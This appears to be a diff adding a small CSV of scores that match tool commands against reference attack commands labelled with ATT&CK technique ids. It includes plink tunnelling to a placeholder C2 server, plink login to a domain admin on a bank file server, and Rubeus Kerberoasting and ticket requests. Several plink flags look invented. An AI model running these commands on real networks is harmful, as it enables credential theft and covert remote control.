@@ -1,0 +1,6 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_plink_TA0011_T1071.txt,plink,plink -shareexists <dns_tunnel_session>,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.447,True
+command_plink_TA0011_T1071.txt,plink,plink -sshlog <dns_tunnel_log_file>,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.42,True
+command_plink_TA0011_T1071.txt,plink,plink -share <dns_tunnel_session> -nc <c2_server>:<c2_port>,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.419,True
+command_plink_TA0011_T1071.txt,plink,plink -sshrawlog <dns_tunnel_raw_log_file>,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.386,True
+command_rubeus_TA0005_T1027.txt,rubeus,rubeus asktgs /ticket:<base64(ticket.kirbi)> /enc:aes256,`rubeus.exe kerberoast /domain:oz.local`,0.312,True
